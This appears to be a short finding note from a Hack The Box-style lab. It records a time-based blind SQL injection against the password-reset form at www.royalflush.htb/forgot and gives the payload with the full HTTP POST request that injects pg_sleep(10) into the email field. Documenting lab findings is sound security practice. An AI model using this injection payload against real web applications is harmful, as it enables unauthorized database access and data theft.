## SQLI AT https://www.royalflush.htb/forgot
payload `asd%40me.c'||+(SELECT+pg_sleep(10)::text)||'`

### Request 
```POST /forgot HTTP/1.1
Host: www.royalflush.htb
Cookie: session=eyJjc3JmX3Rva2VuIjoiOWM3NWFjZmMxNWMxZDgyNjAxNTk2Y2YxY2FjNDczODk3N2ExZDQ2YSJ9.anbeug.j36tmt5PANRFiIG2D62bEhlbUbo
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Origin: https://www.royalflush.htb
Referer: https://www.royalflush.htb/forgot
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

email=asd%40me.c'||+(SELECT+pg_sleep(10)::text)||'&csrf_token=IjljNzVhY2ZjMTVjMWQ4MjYwMTU5NmNmMWNhYzQ3Mzg5NzdhMWQ0NmEi.anbewQ.zb1KnWGEDBsZOMxVhX87RuuN-fo
```

